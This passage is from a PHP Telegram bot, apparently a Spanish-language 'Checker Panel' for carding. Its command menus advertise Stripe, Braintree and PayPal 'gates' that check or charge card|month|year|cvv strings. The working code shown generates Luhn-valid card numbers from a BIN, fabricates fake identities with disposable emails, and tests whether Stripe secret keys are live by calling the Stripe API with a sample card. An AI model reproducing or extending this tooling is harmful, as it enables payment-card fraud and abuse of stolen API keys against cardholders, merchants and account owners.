sendMessage($chat_id,$respuesta,$message_id);
die();
}
}

}else{
$respuesta = "❌ Unban: $chat_id) ($id) Función no disponible para usuarios Free!\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


if($users[$id]['registered'] != true){
        $users[$id] = array('registered' => true, 'msgs' => 0, 'date' => $date, 'banned' => false);
    $users = json_encode($users);
    file_put_contents($fn, $users);
    $users = json_decode($users, true);
}

if($users[$id]['banned'] == true){
$respuesta = "❌ Estas baneado!\n";
sendMessage($chat_id,$respuesta,$message_id);
    fclose($fp);
    exit();
}
*/
/*
$date = time();
//---------------------
$users[$id]['msgs'] = $users[$id]['msgs'] + 1;
$users = json_encode($users);
file_put_contents($fn, $users);
$users = json_decode($users, true);

if($date <= $users[$id]['date'] + 30 and $users[$id]['msgs'] >= 3){
$respuesta = "[ANTI SPAM] Try again after 30s\n";
//echo "$respuesta";
sendMessage($chat_id,$respuesta,$message_id);
    exit();
}
if($date > $users[$id]['date'] + 30){
        $users[$id]['date'] = $date;
    $users[$id]['msgs'] = 0;
    $users = json_encode($users);
        file_put_contents($fn, $users);
    $users = json_decode($users, true);
}

//echo "Puedes enviar mensajes\n";
//sendMessage($id, "Ciao!");
fclose($fp);
*/
/*
$date = time();
static $users = array();

if (!isset($users[$id])) {
    $users[$id] = ['date' => 0, 'msgs' => 0];
}

$users[$id]['msgs']++;
$users[$id]['date'] = $date;

if ($date <= $users[$id]['date'] + 30 && $users[$id]['msgs'] >= 3) {
    $respuesta = "[ANTI SPAM] Try again after 30s\n";
    sendMessage($chat_id, $respuesta, $message_id);
    exit();
}

if ($date > $users[$id]['date'] + 30) {
    $users[$id]['date'] = $date;
    $users[$id]['msgs'] = 0;
}*/



//Almacenar los tiempos de mensajes en la sesión
//Almacenar los tiempos de mensajes en la sesión
if (!isset($_SESSION['message_times'])) {
    $_SESSION['message_times'] = [];
}

// Obtener actualizaciones

//if (isset($upda['message'])) {
  //  $chat_id = $json['message']['chat']['id'];

    // Inicializar el registro de mensajes para el usuario si no existe
    if (!isset($_SESSION['message_times'][$chat_id])) {
        $_SESSION['message_times'][$chat_id] = [];
    }

    // Filtrar mensajes antiguos (más de 30 segundos)
    $_SESSION['message_times'][$chat_id] = array_filter(
        $_SESSION['message_times'][$chat_id],
        function ($timestamp) {
            return time() - $timestamp < 120; // Mantener solo los mensajes dentro de los últimos 30 segundos
        }
    );

    // Verificar cuántos mensajes ha enviado el usuario en los últimos 30 segundos
    if (count($_SESSION['message_times'][$chat_id]) >= 2) {
       $respuesta = "⏳ Has alcanzado el límite de mensajes. Espera 30 segundos antes de enviar más.";
       sendMessage($chat_id,$respuesta,$message_id);
//       echo "$respuesta\n";
      return;
    }

    // Agregar el nuevo mensaje a la lista de tiempos
    $_SESSION['message_times'][$chat_id][] = time();

    // Responder al mensaje del usuario
//    $respuesta = "😊 Tu mensaje ha sido recibido.";
//    sendMessage($chat_id,$respuesta,$message_id);
//}







//-----BIENVENIDA NUEVO INTEGRANTE------//

//$data = json_decode($json, true);
$data = $upda;

if (isset($data['message']['new_chat_participant']) ||
    isset($data['message']['new_chat_member']) ||
    isset($data['message']['new_chat_members'])) {

    // Un nuevo usuario se ha unido al grupo
    $new_user_id = $data['message']['new_chat_participant']['id'] ??
                   $data['message']['new_chat_member']['id'] ??
                   $data['message']['new_chat_members'][0]['id'];

    $new_user_name = $data['message']['new_chat_participant']['first_name'] ??
                     $data['message']['new_chat_member']['first_name'] ??
                     $data['message']['new_chat_members'][0]['first_name'];

    $new_username = $data['message']['new_chat_participant']['username'] ??
                    $data['message']['new_chat_member']['username'] ??
                    $data['message']['new_chat_members'][0]['username'];
	
    $chat_title = $data['message']['chat']['title'];


//$chat_id = 1292171163; // Reemplaza con el ID del chat donde quieres enviar la foto
$photoID = 'AgACAgEAAxkBAAI1-GcyYUp-dDkeJgZASNIMKESwTVr3AAJ9rTEbRFOYRa60ta4yFkQsAQADAgADcwADNgQ';
$message_id = isset($update['message_id']) ? $update['message_id'] : null; // Obtén el ID del mensaje actual si existe
	
$respuesta =  "¡Hola $new_user_name! Bienvenido/a al Chat de $chat_title.\n\n‣ ᴜsᴇʀ ɪᴅ: <code>$new_user_id</code>\n‣ ғᴜʟʟ ɴᴀᴍᴇ: $new_user_name\n‣ ᴜsᴇʀɴᴀᴍᴇ: @$new_username\n‣ ᴜsᴇʀ ᴛʏᴘᴇ: $tipo\n\nDisfruta de nuestra comunidad y recuerda respetar las reglas para asegurar una experiencia óptima.\n";
sendPhoto($chat_id, $photoID, $respuesta, $message_id);
//sendMessage($chat_id,$respuesta,$message_id);
	
} elseif (isset($data['message']['left_chat_participant']) || isset($data['message']['left_chat_member'])) {
    // Un usuario ha salido del grupo
    $left_user_id = $data['message']['left_chat_participant']['id'] ?? $data['message']['left_chat_member']['id'];
    $left_user_name = $data['message']['left_chat_participant']['first_name'] ?? $data['message']['left_chat_member']['first_name'];
    $left_username = $data['message']['left_chat_participant']['username'] ?? $data['message']['left_chat_member']['username'];
$respuesta =  "¡Hasta luego $left_user_name, nadie te extrañara!\n\n‣ ᴜsᴇʀ ɪᴅ: <code>$left_user_id</code>\n‣ ғᴜʟʟ ɴᴀᴍᴇ: $left_user_name\n‣ ᴜsᴇʀɴᴀᴍᴇ: @$left_username\n";
sendMessage($chat_id,$respuesta,$message_id);
} else {
    // No es un evento de entrada o salida
}



// Start Commands
if (strpos($message, ".start") === 0 || strpos($message, "!start") === 0 || strpos($message, "/start") === 0) {
$respuesta = "─ Checker Panel ─\n\n⁕ Registered as ➞ ".$admin."\n⁕ Use ➞ ".$update["chat"]["type"]." | ".$message1["chat"]["type"]." /cmds to show available commands.\n⁕ Bot by: $admin\n";
sendMessage($chat_id,$respuesta,$message_id);
}
// Cmds Commands
elseif((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)||(strpos($message, ".cmds") === 0)) {
        $respuesta = "━━━━•⟮ ᴄʜᴇᴄᴋᴇʀ ᴄᴏᴍᴍᴀɴᴅs ⟯•━━━━\n\n➩ Check User Info ✔\n⁕ Usage: /me\n➩ Check ID chat ✔\n⁕ Usage: /id\n➩ List Command Gates ✔\n⁕ Usage: /gts\n\n◤━━━━━ ☆. 𝙴𝚇𝚃𝚁𝙰𝚂 .☆ ━━━━━◥\n\n⌦ Bin Check ➟ !bin ✔\n⁕ Usage: !bin xxxxxx\n⌦ Checker IBAN ➟ !iban ✔\n⁕ Usage: !iban xxxxxx\n⌦ SK Key Check ➟ !ks ✔\n⁕ Usage: !ks ks_live_xxxx\n⌦ GEN ➟ !gen ✔\n⁕ Usage: !gen xxxxxx\n\n◤━━ ☆. 𝙴𝚇𝚃𝚁𝙰𝙿𝙾𝙻𝙰𝙲𝙸𝙾𝙽 .☆ ━━◥\n\n° ᭄ Basica ➟ /extb ✔\n⁕ Usage: !extb ᴄᴄs1\n° ᭄ Similitud ➟ /exts ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n° ᭄ Avanzada ➟ /exta ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n° ᭄ Indentacion ➟ /exti ✔\n⁕ Usage: !extb ᴄᴄs1\n ᭄ Sophia ➟ /extm ✔\n⁕ Usage: !extb ᴄᴄs1-ᴄᴄs2\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}                                                                     

elseif((strpos($message, "!gts") === 0)||(strpos($message, "/gts") === 0)||(strpos($message, ".gts") === 0)) {
        $respuesta = "━━━━•⟮ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗚𝗮𝘁𝗲𝘀 ⟯•━━━━\n\n➩ Gates Chargeds ✔\n⁕ Usage: /chds\n➩ Gates Auth ✔\n⁕ Usage: /ats\n➩ Gates PayPal ✔\n⁕ Usage: /pys\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}

elseif((strpos($message, "!chds") === 0)||(strpos($message, "/chds") === 0)||(strpos($message, ".chds") === 0)) {
//      $respuesta = "\n◤━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙲𝙷𝙰𝚁𝙶𝙴𝙳𝚂 ☆ ━━━◥\n\n🔥 Stripe ($50) ✔\n➣ Checker ➟ !stp\n⁕ Usage: !stp ccs|month|year|cvv\n\n🔥 Charged ($20) ✔\n➣ Checker ➟ !pa\n⁕ Usage: !pa ccs|month|year|cvv\n\n🔥 Charged ($5) ✔\n➣ Checker ➟ !ch\n⁕ Usage: !ch ccs|month|year|cvv\n\n🔥 Charged ($10) ✔\n➣ Checker ➟ !fa\n⁕ Usage: !fa ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Chargeds\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Stripe ($50) ✔\n➣ Command ➟ /stp\n⁕ Status: ON!✅\n\n🔥 Charged ($5) ✔\n➣ Command ➟ /go\n⁕ Status: ON!✅\n\n🔥 Charged ($20) ✔\n➣ Command ➟ /pa\n⁕ Status: ON! ✅\n\n🔥 Command ($5) ✔\n➣ Checker ➟ /ch\n⁕ Status: ON!✅\n\n🔥 Carged ($10) ✔\n➣ Command ➟ /fa\n⁕ Status: OFF!❌\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}

elseif((strpos($message, "!ats") === 0)||(strpos($message, "/ats") === 0)||(strpos($message, ".ats") === 0)) {
        //$respuesta = "\n◤━━━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙰𝚄𝚃𝙷 ☆ ━━━━━◥\n\n🔥 Stripe Auth 3DS ✔\n➣ Checker ➟ !he\n⁕ Usage: !he ccs|month|year|cvv\n\n🔥 Stripe Auth ✔\n➣ Checker ➟ !ho\n⁕ Usage: !ho ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree CCN_V3 ✔\n➣ Command ➟ /tr\n⁕ Status: ON!✅\n\n🔥 Stripe 3D ✔\n➣ Command ➟ /ta\n⁕ Status: ON!✅\n\n🔥 Woo Stripe ✔\n➣ Command ➟ /wo\n⁕ Status: ON!✅\n\n🔥 Braintree Auth ✔\n➣ Command ➟ /ho\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}


elseif((strpos($message, "!pys") === 0)||(strpos($message, "/pys") === 0)||(strpos($message, ".pys") === 0)) {
        //$respuesta = "\n◤━━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙿𝚊𝚢𝙿𝚊𝚕 ☆ ━━━━◥\n\n🔥 Paypal ✔\n➣ Checker ➟ !pp\n⁕ Usage: !pp ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates PayPal\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Paypal ✔\n➣ Command ➟ /pp\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
        sendMessage($chat_id,$respuesta,$message_id);
}

elseif((strpos($message, "!me") === 0)||(strpos($message, "/me") === 0)||(strpos($message, ".me") === 0))
{
	$respuesta = "[ ↯ ] ᴍʏ ᴀʙᴏᴜᴛ [ ↯ ]\n\n‣ ᴜsᴇʀ ɪᴅ:".$id."\n‣ ғᴜʟʟ ɴᴀᴍᴇ: ".$Name." ".$last."\n‣ ᴜsᴇʀɴᴀᴍᴇ: @".$user."\n‣ ᴜsᴇʀ ᴛʏᴘᴇ: ".$tipo."\n";
//$respuesta = "⁕ ─ 𝑈𝑆𝐸𝑅 𝐼𝑁𝐹𝑂 ─ ⁕\n➩ 𝚄𝚂𝙴𝚁 𝙸𝙳: <code>".$id."</code>\n➩ 𝙵𝚄𝙻𝙻 𝙽𝙰𝙼𝙴: ".$Name." ".$last."\n➩ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴: @".$user."\n➩ 𝚄𝚂𝙴𝚁 𝚃𝚈𝙿𝙴: ".$tipo."\n";
	$respuesta = "     [ ↯ ] ᴍʏ ᴀʙᴏᴜᴛ [ ↯ ]\n\n‣ ᴜsᴇʀ ɪᴅ: <code>".$id."</code>\n‣ ғᴜʟʟ ɴᴀᴍᴇ: ".$Name." ".$last."\n‣ ᴜsᴇʀɴᴀᴍᴇ: @".$user."\n‣ ᴜsᴇʀ ᴛʏᴘᴇ: ".$tipo."\n";
	sendMessage($chat_id,$respuesta,$message_id);
}
//--------------------------END INFO-------------------------//


elseif((strpos($message, "!gen") === 0)||(strpos($message, "/gen") === 0)||(strpos($message, ".gen") === 0)){
$si = substr($message, 5);

if($si != ''){
}else{
$respuesta = "━━━━━━━•⟮ɢᴇɴ ᴄᴄs⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !gen xxxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .gen xxxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$lista = substr($message, 5);
$target = substr($lista, 0,2);

$bin = explode("|", $lista)[0];
$mes1 = explode("|", $lista)[1];
$ano1 = explode("|", $lista)[2];
$cvv1 = explode("|", $lista)[3];
$d4 = "".$bin."xxxxxxxxxxxxxxxxx";

if ($target == "37" || $target == "34"){
        $bin = substr($d4, 0, 14);
        $cant = "15";

}else{
        $bin = substr($d4, 0, 15);
        $cant = "16";
}
	
$Bin = substr($bin, 0, 6);
$amount = "10";

if (empty($mes1)){
$mes1="rnd";
}
if (empty($ano1)){
$ano1="rnd";
}
if (empty($cvv1)){
$cvv1="rnd";
}
sleep(1);


for ($i=$amount;$i>-0;$i--){

//-------GERADOR DE MES - AÑO - CCV -------//
        $randMonth = rand(1, 12);
        $randYears = rand(25, 30);
if ($target == "37" || $target == "34"){
        $randCvv = rand(1000, 9999);
}else{
        $randCvv = rand(100, 999);
}
        $randMonth < 10 ? $randMonth = "0" . $randMonth : $randMonth = $randMonth;
        $randCvv < 100 ? $randCvv = "0" . $randCvv : $randCvv = $randCvv;
        $fecha = "|".$randMonth."|20".$randYears."|".$randCvv;

//-----GENERADOR DE CC------//
if(is_numeric($mes1)){
$mes = $mes1;
}else{
$mes = $randMonth;
}
if(is_numeric($ano1)){
$ano = $ano1;
}else{
$ano = "20$randYears";
}
if(is_numeric($cvv1)){
$cvv = $cvv1;
}else{
$cvv = $randCvv;
}
$data = "|$mes|$ano|$cvv";
            $ccNumber = $bin;
            while (strlen($ccNumber) < ($cant - 1)) {
                $ccNumber .= rand(0, 9);
            }
            $ccNumber = str_split($ccNumber);
            $replace = "";
            foreach ($ccNumber as $cc => $key) {
            $replace .= str_replace("x", rand(0, 9), $key);
            }

$ccs = Calculate($replace, $cant);
$cards = $ccs.$data;
$data = "<code>".$cards."</code>";

$da = "".$data."\n";
        $archivo = fopen("cc-gen","a");
        fwrite($archivo,$da);
        fclose($archivo);
        }

        $ccs = file_get_contents("cc-gen");

$Bin_Gen = Bin_Gen_Info($Bin); //
$Bin = "<code>$Bin</code>";
$respuesta = "➭ 𝙱𝙸𝙽: $Bin\n➭ 𝙰𝙼𝙾𝚄𝙽𝚃: 10\n\n$ccs\n".$Bin_Gen."";


//$respuesta = "➭ 𝙱𝙸𝙽: $Bin\n➭ 𝙰𝙼𝙾𝚄𝙽𝚃: 10\n\n$ccs\n➭ 𝙱𝙸𝙽 𝙸𝙽𝙵𝙾: $brand - $type - $level\n➭ 𝙱𝙰𝙽𝙺: $bank\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: $count\n";
editMessage($chat_id,$respuesta,$id_text);
unlink("cc-gen");
die();
}





elseif((strpos($message, "!fake") === 0)||(strpos($message, "/fake") === 0)||(strpos($message, ".fake") === 0)){

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$startTime = microtime(true); //TIEMPO DE INICIO
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = ucfirst($matches1[1][0]);
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = ucfirst($matches1[1][0]);
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = ucfirst($matches1[1][0]);
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = ucfirst($matches1[1][0]);
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = ucfirst($matches1[1][0]);
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
//---------------------------////---------------------------//
$response = file_get_contents('https://www.fakemailgenerator.com');
preg_match('/value="([^"]+)"/', $response, $matches);
$GmailUser = $matches[1];
//---------------------------//
// Extraer el valor del dominio
preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $matches);
$dominio = trim($matches[1]);
// Eliminar espacios en blanco
//---------------------------//
$usr = str_replace("@", "", $dominio);
//---------------------------//
$email = "$GmailUser$dominio";
$link = "https://www.fakemailgenerator.com/#/$usr/$GmailUser/";

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '',4);
$respuesta = "━━━━━━•⟮ғᴀᴋᴇ ᴜsᴇʀ⟯•━━━━━━\n➭ 𝙽𝙰𝙼𝙴: <code>".$name."</code>\n➭ 𝙻𝙰𝚂𝚃 𝙽𝙰𝙼𝙴: <code>".$last."</code>\n➭ 𝙴𝙼𝙰𝙸𝙻: <code>".$email."</code> <a href='".$link."'>(ᴏᴘᴇɴ ʟɪɴᴋ)</a>\n➭ 𝚂𝚃𝚁𝙴𝙴𝚃: <code>".$street."</code>\n➭ 𝙲𝙸𝚃𝚈: <code>".$city."</code>\n➭ 𝚂𝚃𝙰𝚃𝙴: <code>".$state."</code>\n➭ 𝙿𝙷𝙾𝙽𝙴: <code>".$phone."</code>\n➭ 𝙿𝙾𝚂𝚃 𝙲𝙾𝙳𝙴: <code>".$postcode."</code>\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝚄𝚂𝙴𝚁: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: $admin\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);

}


elseif((strpos($message, "!ks") === 0)||(strpos($message, "/ks") === 0)||(strpos($message, ".ks") === 0)){
$si = substr($message, 4);
$key = substr($message, 4);

if(preg_match_all("/sk_(test|live)_[A-Za-z0-9]+/", $key, $matches)) {
$sk = $matches[0][0];
}



if ($si != '' && $sk != '' ){
}else{
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ks sk_live_xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ks sk_live_xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ks sk_live_xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


// Bonus: SK Key Checker
$skhiden = substr_replace($sk, '',12).preg_replace("/(?!^).(?!$)/", "*", substr($sk, 12));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252");
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

$message = trim(strip_tags(getStr($result,'"message":"','.')));
if (empty($message)) {
$message = 'Charge Found';
}

if (strpos($result, 'api_key_expired')){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK EXPIRED ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Expired API key Provided.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif (strpos($result, 'Invalid API Key provided')){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK INVALID ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Invalid API Key Provided.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif ((strpos($result, 'You did not provide an API key.')) || (strpos($result, 'You need to provide your API key in the Authorization header,'))){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK DEAD ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: You did not provide an API key.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK DEAD ❌\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: Your account cannot currently make live charges.\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}else{
$respuesta = "━━━━━━•⟮sᴋ ᴋᴇʏ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━\n➭ 𝙺𝙴𝚈: ".$skhiden."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: SK LIVE ✅\n➭ 𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ".$message.".\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
editMessage($chat_id,$respuesta,$id_text);
}
}



elseif((strpos($message, "!iban") === 0)||(strpos($message, "/iban") === 0)||(strpos($message, ".iban") === 0)){
$si = substr($message, 6);

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ɪʙᴀɴ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /iban xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !iban xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .iban xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//$message = "/iban 4520880028518536|03|2023|854";
$ibanx = substr($message, 6);
$iban = substr($ibanx, 0, 6);
$startTime = microtime(true); //TIEMPO DE INICIO
$curl = curl_init('https://openiban.com/validate/'.$iban.'?validateBankCode=true&getBIC=true');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
curl_close($curl);

$bankcode1 = capture($content, '"bankCode": "', '"');
$bankname = capture($content, '"name": "', '"');
$zip = capture($content, '"zip": "', '"');
$city = capture($content, '"city": "', '"');
$bic = capture($content, '"bic": "', '"');
$timetakeen = (microtime(true) - $startTime);
$timetaken = substr_replace($timetakeen, '',4);

if(strpos($content, 'valid": true')){
$respuesta = "IBAN -LIVE ✅ $iban\nBIC: $bic\nBank Code: $bankcode1\nBank: $bankname\nCity: $city\nTime: $timetaken's\n━━━━━━━━━━━━━";
editMessage($chat_id,$respuesta,$id_text);
}
elseif(strpos($content, 'valid": false')){
$respuesta = "IBAN - DEAD ❌ $iban\nTime: $timetaken's";
editMessage($chat_id,$respuesta,$id_text);
}

}



elseif((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)||(strpos($message, ".bin") === 0)){
$si = substr($message, 5);

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ʙɪɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /bin xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !bin xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .bin xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$bin = substr($message, 5);
$bin = substr("$bin", 0, 6);
$startTime = microtime(true); //TIEMPO DE INICIO


//Extrae la información del bin///
$bin_info = Bininfo($bin);
